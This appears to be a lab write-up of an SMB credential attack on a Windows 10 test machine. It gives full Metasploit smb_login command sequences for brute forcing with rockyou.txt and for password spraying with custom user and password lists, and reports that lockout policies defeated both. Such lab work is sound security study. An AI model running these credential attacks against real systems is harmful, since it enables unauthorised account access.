# SMB-Credential-Attack-Lab-From-Setup-to-Defensive-Roadblock
SMB credential attack lab against a Windows 10 target using Metasploit, covering brute force and password spraying techniques. The exercise included wordlist preparation, handling extraction issues, and testing authentication resilience. No valid credentials were found, revealing strong account lockout policies and a hardened SMB configuration.

###  Objective

To perform an SMB credential attack against a Windows 10 target and evaluate the effectiveness of brute force and password spraying techniques in a controlled lab environment.

---

##  Environment Setup

* Attacker Machine: Kali Linux
* Target Machine: Windows 10
* Target IP: `192.168.56.124`
* Tool Used: Metasploit Framework

---

#  PHASE 1: Brute Force Attempt

##  Step 1: Initial Wordlist Validation Issue

While preparing for the credential attack, I attempted to use the commonly available `rockyou.txt` password list.

Initial check showed:

```bash
ls /usr/share/wordlists/
```

Output included:

```
rockyou.txt.gz
```

This indicated that the wordlist was still compressed and not directly usable.

---

##  Step 2: Permission Error During Extraction

Attempting to extract the file resulted in a permission error:

```bash
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

Error:

```
Permission denied
```

---

##  Step 3: Resolving the Issue

Using elevated privileges resolved the issue:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

Verification:

```bash
ls /usr/share/wordlists/
```

Confirmed:

```
rockyou.txt
```

File integrity check:

```bash
head /usr/share/wordlists/rockyou.txt
```

Output:

```
123456
12345
123456789
password
...
```

---

##  Step 4: SMB Credential Attack Execution (Brute Force)

Using Metasploit:

```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.56.124
set SMBUser Administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
set THREADS 5
run
```

---

##  Step 5: Brute Force Outcome

Observed repeated failed login attempts:

```
Failed: .\Administrator:123456
Failed: .\Administrator:password
...
```

Final system response:

```
Account lockout detected on 'Administrator'
```

---

##  Phase 1 Key Findings

###  1. Wordlist Preparation Matters

* Tools depend on correct file formats
* Compressed files must be extracted before use
* Permission handling is critical in Linux environments

---

###  2. Brute Force Was Actively Mitigated

* The system enforced an account lockout policy
* Repeated login attempts triggered defensive controls
* Further brute force attempts were blocked

---

---

#  PHASE 2: Password Spraying Strategy

##  Step 6: Strategy Pivot

Due to account lockout during brute force, the attack strategy was adjusted to password spraying to reduce detection risk.

---

##  Step 7: Creating Custom User List

```bash
nano users.txt
```

Contents:

```
Administrator
user
admin
guest
test
```

---

##  Step 8: Creating Custom Password List

```bash
nano spray.txt
```

Contents:

```
Password123
Welcome1
Summer2024
Admin123
```

---

##  Step 9: SMB Password Spraying Execution

```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.56.124
set USER_FILE users.txt
set PASS_FILE spray.txt
set STOP_ON_SUCCESS true
set THREADS 3
run
```

---

##  Step 10: Password Spraying Outcome

All authentication attempts failed:

```
Failed: .\Administrator:Password123
Failed: .\user:Welcome1
Failed: .\admin:Admin123
...
```

Final result:

```
0 credentials were successful
```

---

##  Phase 2 Key Findings

###  1. No Weak or Default Credentials

* Common passwords were ineffective
* No credential reuse observed

---

###  2. System Remains Hardened

* Resistant to both brute force and password spraying
* Authentication requires valid, non-trivial credentials


#  Tactical Insight

Initial assumption:

> SMB exposure could lead to credential compromise via brute force

Evolved understanding:

> Modern Windows systems resist both brute force and password spraying when proper authentication controls are enforced

---

##  Lessons Learned

* Proper wordlist handling is essential before executing attacks
* Brute force is ineffective against systems with lockout policies
* Password spraying is more realistic but still depends on valid user context
* Attack strategies must adapt based on system response
* Hardened systems require intelligence-driven approaches, not blind guessing

---

##  Conclusion

This lab demonstrates the progression from brute force to password spraying in an attempt to gain SMB access. Despite correct execution and adaptation of techniques, the Windows 10 target remained secure due to enforced authentication controls and lockout mechanisms. This highlights the importance of understanding defensive measures and adjusting offensive strategies accordingly.

---
